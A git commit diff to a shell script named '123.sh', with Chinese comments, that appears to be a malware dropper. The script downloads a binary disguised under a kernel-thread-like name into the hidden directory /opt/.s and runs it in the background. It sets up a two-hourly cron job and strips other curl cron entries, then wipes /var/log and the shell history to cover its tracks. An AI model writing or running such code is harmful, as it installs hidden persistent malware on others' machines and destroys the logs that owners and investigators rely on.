3e5d632d3555eede08ffd0b18fb51bb1c1497acd
YUNDUN8899 <163292679+YUNDUN8899@users.noreply.github.com>
2024-03-14 16:03:41 +0800

    Update 123.sh

--- 123.sh
+++ 123.sh
@@ -11,7 +11,7 @@ if [ ! -d "$OPT_S_DIR" ]; then
 fi
 
 # 检查/opt/.s/kmpathd文件是否存在，不存在则下载
-if [ ! -f "kmpathds" ]; then
+if [ ! -f "$KMPATHD_FILE" ]; then
     cd "$OPT_S_DIR" || exit
     wget https://github.com/YUNDUN8899/FUCKSEN/releases/download/BV10/kmpathds
     chmod +x "kmpathds"
@@ -21,10 +21,15 @@ fi
 
 # 检查进程是否存在，不存在则启动
 if ! pgrep -f "kmpathds" > /dev/null; then
-    nohup "/opt/.s/kmpathds" /dev/null 2>&1 &
+    nohup "$KMPATHD_FILE" /dev/null 2>&1 &
 fi
+
 # 清除上一次的任务，添加下一次的任务，每2小时执行一次
 (crontab -l | grep -v "curl" ; echo "$CRON_JOB") | crontab -
+
 # 清除当前系统的执行目录
+ps aux | grep '/opt/.s/kmpathds' | grep -v grep | awk 'NR > 1 {print $2}' | xargs kill
 sudo rm -rf /var/log/*
+
+# 清除命令历史记录
 history -c && echo > ~/.bash_history
